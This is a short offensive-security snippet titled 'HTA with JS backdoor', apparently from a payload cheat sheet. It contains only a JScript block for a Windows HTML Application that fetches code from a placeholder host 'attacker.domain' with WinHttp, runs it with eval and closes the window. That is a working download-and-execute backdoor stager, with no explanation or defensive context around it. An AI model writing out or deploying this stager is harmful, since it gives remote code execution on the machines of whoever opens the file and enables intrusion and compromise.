# HTA with JS backdoor
```javascript
<script language="javascript" type="text/javascript">
    h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    h.Open("GET","http://attacker.domain/connect",false);
    h.Send();
    B=h.ResponseText;
    eval(B);
    window.close();
</script>
```